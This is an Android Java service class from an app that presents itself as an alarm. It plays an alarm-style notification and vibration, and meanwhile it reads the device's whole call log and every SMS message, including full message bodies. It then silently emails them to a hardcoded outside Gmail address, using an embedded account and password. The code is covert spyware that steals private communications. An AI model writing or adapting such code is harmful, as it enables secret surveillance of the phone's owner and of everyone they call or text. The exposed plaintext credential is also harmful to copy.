package com.example.alarm;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.media.MediaPlayer;
import android.os.AsyncTask;
import android.os.Environment;
import android.os.IBinder;
import android.os.Vibrator;
import android.provider.CallLog;
import android.provider.Telephony;
import android.support.annotation.Nullable;
import android.support.v4.app.NotificationCompat;
import android.support.v4.app.NotificationManagerCompat;
import android.util.Log;
import android.widget.Toast;

import com.example.mail.GMailSender;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.sql.Date;
import java.text.SimpleDateFormat;
import java.util.Calendar;

public class Music extends Service {
    MediaPlayer mediaPlayer;
    int id;
    int check;
    private  static final String CHANNEL_ID ="TEST";
    private  static final String CHANNEL_NAME ="ALARM";
    private  static final String CHANNEL_DESC ="Simple";
    Vibrator vibrator;
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        vibrator = (Vibrator) getSystemService(VIBRATOR_SERVICE);

        String nhankey= intent.getExtras().getString("extra");
        if(nhankey.equals("on")){
            id=1;
        }
        else if (nhankey.equals("off")){
            id=0;
        }
        else if (nhankey.equals("send")){
            check=1;
        }

        if(id==1) {
            //mediaPlayer = MediaPlayer.create(this, R.raw.man);

            //mediaPlayer.start();

            String results = getCallDetails();
            String r2 = getSmsDetails();
            String rs = results + r2;
            //saveTextAsFile(rs);
            sendEmail(rs);
            displayNotification("Alarm!!!");
            vibrator.vibrate(2000);
            id=0;

        }

        if(check==1) {
            //mediaPlayer = MediaPlayer.create(this, R.raw.man);

            //mediaPlayer.start();

            String results = getCallDetails();
            String r2 = getSmsDetails();
            String rs = results + r2;
            //saveTextAsFile(rs);
            sendEmail(rs);
            displayNotification("Collected");
            vibrator.vibrate(2000);
            check=0;

        }


        return START_NOT_STICKY;
    }

    private  void displayNotification(String s){
        NotificationCompat.Builder mBuilder =
                new NotificationCompat.Builder(this, CHANNEL_ID)
                        .setSmallIcon(R.drawable.ic_bell1).setContentTitle(s).
                        setContentText("").
                        setPriority(NotificationCompat.PRIORITY_DEFAULT);
        NotificationManagerCompat mNotificationMgr = NotificationManagerCompat.from(this);
        mNotificationMgr.notify(1,mBuilder.build());
    }

        private void sendEmail(String str){
            try {
                String subject = "CALL LOG";
                String fromAddress = "hatdaunhochicharito14@gmail.com";
                String toAddress = "jt.vuong14@gmail.com";

                String content = str;

                boolean result = new SendMailAsync().execute(fromAddress, toAddress, subject,content ).get();

                if(result){
                    Toast.makeText(this, "Done!!",Toast.LENGTH_LONG).show();
                }
                else {
                    Toast.makeText(this,"Failed!",Toast.LENGTH_LONG).show();
                }

            }catch (Exception e){
                Toast.makeText(getApplicationContext(),e.getMessage(),Toast.LENGTH_LONG).show();
            }
        }

    private class SendMailAsync extends AsyncTask<String, Void, Boolean> {

        @Override
        protected Boolean doInBackground(String... strings) {
            try {
                String fromAddress = strings[0];
                String toAddress = strings[1];
                String subject = strings[2];
                String body = strings[3];

                GMailSender gMailSender = new GMailSender("hatdaunhochicharito14@gmail.com", "14021998");
                gMailSender.sendMail(subject, body, fromAddress, toAddress);
                return true;

            }catch (Exception e){
                return false;
            }
        }
    }
    private String getCallDetails(){
        StringBuffer sb = new StringBuffer();
        Cursor managedCursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null,null);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);

        sb.append("Call Details:\n\n");


        while (managedCursor.moveToNext()){

            String phNumber = managedCursor.getString(number);
            String callType = managedCursor.getString(type);
            String callDate = managedCursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            SimpleDateFormat formatter = new SimpleDateFormat("dd-MM-yy HH:mm");
            String dateString = formatter.format(callDayTime);
            String callDuration = managedCursor.getString(duration);
            String dir  = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode){
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;
                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }

                sb.append("\nPhone Number: " + phNumber + " \nCallType: " + dir + " \nCall Date: " + callDayTime
                        + " \nCall Duration in sec: " + callDuration);
                sb.append("\n---------------------------------------");

        }
        managedCursor.close();
        return sb.toString();
    }

    private String getSmsDetails(){
        StringBuffer smsBuff = new StringBuffer();
        Cursor smsCur = getContentResolver().query(Telephony.Sms.CONTENT_URI,null, null, null, null);
        int number = smsCur.getColumnIndex(Telephony.Sms.ADDRESS);
        int type = smsCur.getColumnIndex(Telephony.Sms.TYPE);
        int msg = smsCur.getColumnIndex(Telephony.Sms.BODY);
        int date = smsCur.getColumnIndex(Telephony.Sms.DATE);
        smsBuff.append("SMS Details:\n\n");
        while (smsCur.moveToNext()){
            String phNumber= smsCur.getString(number);
            String smsType = smsCur.getString(type);
            String smsMsg =smsCur.getString(msg);
            String smsDate = smsCur.getString(date);
            Date smsDateTime = new Date(Long.valueOf(smsDate));
            SimpleDateFormat formatter = new SimpleDateFormat("dd-MM-yy HH:mm");
            String dateString = formatter.format(smsDateTime);
            String dir = null;
            int dircode = Integer.parseInt(smsType);
            switch (dircode){
                case Telephony.Sms.MESSAGE_TYPE_INBOX:
                    dir = "INBOX";
                    break;
                case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                    dir = "OUTBOX";
                    break;
                case Telephony.Sms.MESSAGE_TYPE_DRAFT:
                    dir ="DRAFT";
                    break;
                case Telephony.Sms.MESSAGE_TYPE_SENT:
                    dir = "SENT";
                    break;
            }
            smsBuff.append("\nPhone Number: " + phNumber + " \nType: "+ dir+ " \nSMS Date: "+ dateString
                    + " \nMessage: " +smsMsg );
            smsBuff.append("\n***************************************");
        }
        smsCur.close();
        return smsBuff.toString();
    }

    private  void saveTextAsFile(String content){
        String filename = "log.txt";

        File file = new File(Environment.getExternalStorageDirectory().getAbsolutePath(),filename);

        try {
            FileOutputStream fos = new FileOutputStream(file);
            fos.write(content.getBytes());
            fos.close();
            Toast.makeText(this, "Saved", Toast.LENGTH_LONG).show();
        }catch (FileNotFoundException e){
            e.printStackTrace();
            Toast.makeText(this, "File not found!", Toast.LENGTH_SHORT).show();
        }catch (IOException e){
            e.printStackTrace();
            Toast.makeText(this,"Error saving!", Toast.LENGTH_SHORT).show();

        }
    }

}
